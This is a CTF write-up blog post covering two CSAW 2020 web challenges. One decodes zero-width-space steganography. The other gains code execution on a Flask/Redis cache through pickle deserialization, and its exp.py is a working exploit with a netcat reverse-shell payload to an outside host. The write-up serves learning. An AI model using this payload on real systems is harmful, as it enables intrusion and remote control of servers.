---
layout: "post"
title: "CSAWCTF 2020 Qualification Round Writeup"
date: "2020-09-14 04:05:47"
date_gmt: "2020-09-14 04:05:47"
modified: "2020-09-14 04:05:47"
modified_gmt: "2020-09-14 04:05:47"
slug: "csawctf-2020-qualification-round-writeup"
author: "brandonshi123"
status: "publish"
type: "post"
original_url: "https://y4y.space/2020/09/14/csawctf-2020-qualification-round-writeup/"
guid: "http://y4y.space/?p=186"
wordpress_id: 186
parent_id: 0
categories: ["Uncategorized"]
---

{% raw %}
## widthless (Web)

### Challenge Description

Welcome to web! Let's start off with something kinda funky :)

http://web.chal.csaw.io:5018

### Solution

First, go to the actual website.

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-12-04-24-58.png?w=1024)

Nothing looks special, next I checked source-code and found there is a comment saying something about "zwsp".

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-12-04-25-56.png?w=696)

After some researching, "zwsp" stands for "Zero-Width-Space", essentially some unicode characters which do not appear to have space. There are also some zwsp steganography around, so I assume this is going to be the route. But I did not see any 'spaces', so I decided to use curl to look for special characters.

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-12-04-33-00.png?w=1024)

And look at that… I did not see those things when I was examining the source…

Next step I took was to be a script kiddie and find someone else's script to do the work for me. I came cross two github repostories, both called 'zwsp-steg', but one of them being python and another one being javascript. I tried python one first and it does not seem to work, so I had to use the javascript one. [Here](https://github.com/offdev/zwsp-steg-js) is the link to the github page.

Then I followed the instruction on the github page and decode the hidden message in the source.

The decoded text looks like a base64 encoded one, so after decoding:

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-12-04-35-17.png?w=1024)

I first thought this was the flag, but no. So I tried to go to this URL, which also lead me nowhere. Next I noticed the "sign up" button and paste the text I got, then some magic appeared.

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-12-04-36-56.png?w=597)

This looks like an url doesn't it? But what confuses me was the `<pwd>` in the end, what does that even mean? I tried many things but eventually, I just need to substitute the text I got before and it will lead me to a new page, but this time a little bit weird.

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-12-04-39-14.png?w=1024)

Notice the layout is different. I tried to curl again and this time it has more hidden messages…

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-12-04-40-08.png?w=1024)

After decoding this another zwsp message, I got a bunch of digits and letters, from the first two characters I assumed it was going to be hex value of ascii characters. So I used `xxd -r -p` to print out the original text.

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-12-04-42-40.png?w=1024)

I also tried this as flag and of course it did not work. I did the same trick again and this time I got another message from the webpage.

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-12-04-43-43.png?w=644)

I almost panicked, I thought there were more zwsp to decode, but this one is the final.

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-12-04-44-48.png?w=1015)

### Flag

flag{gu3ss_u_f0und_m3}

### Appendix

#### sol.js

```bash
const zwsp = require('zwsp-steg');
const fs = require('fs');
const http = require('http');

// file and raw1 are just request file I redirected using curl.
let url = 'http://web.chal.csaw.io:5018/ahsdiufghawuflkaekdhjfaldshjfvbalerhjwfvblasdnjfbldf/alm0st_2_3z'

try{
        let data = fs.readFileSync('file', 'utf8');
        let decoded = zwsp.decode(data);
        console.log(decoded)

        let data1 = fs.readFileSync('raw1', 'utf8');
        let dec1 = zwsp.decode(data1);
        console.log(dec1);

}catch(err){
        console.error(err)
}
```

## flask_caching (Web)

### Challenge Description

cache all the things (this is python3)

http://web.chal.csaw.io:5000

app.py as attatchment (Included in appendix)

### Solution

From the name and attatch file extension I know it's going to be python flask.

I first thought it might be SSTI but the title of challenge says caching so I guess it has something to do with cache.

After examining the source code I noticed this web server is using redis as its cache service. It also has a million of cached functions which I don't know the purpose. I thought it was going to be a time-based attack but it was not.

There is really nothing exciting about this website, in the index page it asks you for a title and a file as notes, and it will store the title, content key value pair in the redis service running in its localhost.

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-12-04-52-06.png?w=683)

However, those test routes are calling some cached functions, and the cached functions also just returns "test".

```python
@cache.cached(timeout=3)
def _test0():
    return 'test'
@app.route('/test0')
def test0():
    _test0()
    return 'test'
```

After reviewing the source code I was just wondering, how does the cache server store the function? Functions are not like JSON data, so there has got to be a way to store them in a organized way… and that's when I decided to setup my own environment in my local machine.

I installed python3 virtual environment as well as flask and other dependencies. Also started up a redis server on my local machine by just typing `redis-server`.

Now my objective was just to know how data is stored. From the source code, I only have 3 seconds to access the key values in redis server, I need to be quick. I first go to `/test0` to store the function into redis, then I go to redis to check the values of keys.

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-12-05-00-23.png?w=1024)

Now I see the title and content I shall use to overwrite the function, but overwriting the function itself will not do anything. In the sample code above, the `_test0()` function just returns a string, and that was it. And this "test" returned from `_test()` is not what renders out in the web page. The "test" in the web page is returned by the function `test0()`.

I was also curious about the value of test function. If that was just some random data that'd be too weird, and the format of data just reminds me of something… like a serialized pickle object. I never had experience exploiting pickle so I was not sure, but I can always research and try. I find some serialized pickle objects in bytes and they all start with `\x80` but not `!`. Not sure what was going on but I tried to deserialize the data in python3 console. Why python3? Because in the description it says the application is ran by python3.

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-12-05-07-47.png?w=998)

Maybe it was not pickle? I also remembered all the examples I saw starts with `\x80`, so might as well try that.

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-12-05-08-40.png?w=717)

So for some reason it appends "!" to the front of serialized pickle object… Now I know it's pickle, it's probably about exploiting pickle, and thankfully it was not hard to understand. I followed this [blog](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) and it was stright forward.

The attack plan has two steps. The first step is to overwrite the `_test0()` function using my own generated data, next is to access the page so the function get called.

I first test it on my local machine as one should. The final version of exploit is in the appendix, but when I was testing, I used `ping -c 127.0.0.1` command on my own machine to see if the RCE works.

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-13-20-23-27.png?w=1024)

Great! Now there is RCE, next is to move to the actual target. Setup a netcat listener on the server I own which is in the public network, and wait for magic to happen.

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-13-20-30-08.png?w=1019)

I then explored the server for a bit, and found the flag.txt in root directory.

![](https://y4y.space/wp-content/uploads/2020/09/screenshot-from-2020-09-13-20-31-28.png?w=994)

### Flag

flag{f1@sK_10rD}

### Appendix

#### exp.py

```python
#!/usr/bin/env python3

import pickle
import requests
import os

class test:
    def __reduce__(self):
        cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <REDACTED> 9001 >/tmp/f')
        return os.system, (cmd,)

obj = b'!' + pickle.dumps(test())

url = 'http://web.chal.csaw.io:5000/'
# url = 'http://127.0.0.1:5000/'

data = {'title': 'flask_cache_view//test0'}
files = {
        'content': obj
        }

req = requests.post(url, files=files, data=data)
resp = req.content

print(resp)

req1 = requests.get((url + 'test0'))
resp1 = req1.content

print(resp1)
```
{% endraw %}
